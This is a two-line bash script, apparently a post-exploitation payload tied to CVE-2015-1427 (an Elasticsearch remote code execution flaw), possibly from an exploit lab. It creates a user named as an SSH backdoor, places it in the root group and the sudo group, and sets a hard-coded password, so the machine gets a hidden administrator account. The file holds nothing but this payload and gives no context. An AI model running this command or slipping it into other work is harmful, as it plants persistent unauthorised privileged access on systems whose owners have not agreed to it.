#!/usr/bin/env bash

useradd -rm -d /home/ssh_backdoor_cve_2015_1427_pwned -s /bin/bash -g root -G sudo -p $(openssl passwd -1 'cve_2015_1427_pwnedpw') ssh_backdoor_cve_2015_1427_pwned